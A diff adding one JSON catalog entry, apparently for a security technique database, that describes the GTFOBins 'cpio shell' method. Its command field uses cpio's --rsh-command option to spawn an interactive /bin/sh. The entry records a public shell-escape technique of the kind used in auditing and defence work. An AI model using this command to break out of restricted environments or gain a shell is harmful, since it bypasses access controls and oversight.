@@ -1,0 +1,23 @@
+{
+  "id": "gtfo-cpio-shell",
+  "name": "GTFOBins · cpio (shell)",
+  "command": "echo '/bin/sh </dev/tty >/dev/tty' >localhost\ncpio -o --rsh-command /bin/sh -F localhost:",
+  "description": "Use cpio to shell via GTFOBins.",
+  "platform": "linux",
+  "tags": [
+    "gtfobins",
+    "cpio",
+    "shell"
+  ],
+  "source": "gtfobins",
+  "source_url": "https://gtfobins.github.io/gtfobins/cpio/#shell",
+  "upstream_id": "cpio/shell/0",
+  "category": "gtfobins",
+  "subcategory": "shell",
+  "references": [
+    {
+      "title": "GTFOBins",
+      "url": "https://gtfobins.github.io/gtfobins/cpio/"
+    }
+  ]
+}
